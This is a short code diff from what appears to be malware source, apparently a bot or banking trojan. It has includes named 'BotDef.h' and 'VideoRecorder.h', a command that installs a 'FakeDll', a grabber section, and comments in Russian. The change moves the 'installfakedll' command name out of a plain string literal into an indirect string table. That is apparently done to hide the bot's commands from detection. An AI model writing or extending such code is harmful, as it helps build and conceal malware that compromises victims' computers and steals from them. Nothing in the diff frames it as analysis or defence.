@@ -19,6 +19,7 @@
 #include "CabPacker.h"
 #include "BotDef.h"
 #include "VideoRecorder.h"
+#include "StrConsts.h"
 #include <shlobj.h>
 #include <shlwapi.h>
 
@@ -1231,7 +1232,7 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 	RegisterCommand(Manager, (PCHAR)Plugin::CommandUpdatePlug, Plugin::ExecuteUpdatePlug);
 
 	// Команда установки FakeDll
-	RegisterCommand(Manager, (PCHAR)"installfakedll", ExecuteInstallFakeDll);
+	RegisterCommand(Manager, GetStr(CommandInstallFakeDLL).t_str(), ExecuteInstallFakeDll);
 
 	// Команда grabber
 	#ifdef GrabberH
